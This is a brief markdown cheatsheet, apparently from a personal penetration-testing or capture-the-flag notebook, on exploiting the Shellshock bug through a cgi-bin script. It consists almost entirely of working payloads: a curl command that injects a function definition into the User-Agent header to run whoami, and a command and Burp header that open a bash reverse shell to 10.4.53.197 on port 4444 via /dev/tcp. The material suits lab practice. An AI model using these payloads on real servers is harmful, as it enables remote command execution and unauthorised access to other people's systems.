---
categories: [Cheatsheet, Web]
tags: [cheatsheet/web, exploit/shell-shock]
img_path: /Cheatsheet/Web/Shellshock via cgi-bin/images
---

# Test
```
curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://<MACHINE-IP>/cgi-bin/test.cgi
```

# Exploit
- Obtain shell
	```
	curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.4.53.197/4444 0>&1' http://10.10.234.83/cgi-bin/test.cgi

	#Burp:
	User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.4.53.197/4444 0>&1
	```

# Some Example
- [[0day#Exploiting Shell Shock Reverse Shell User flag]]



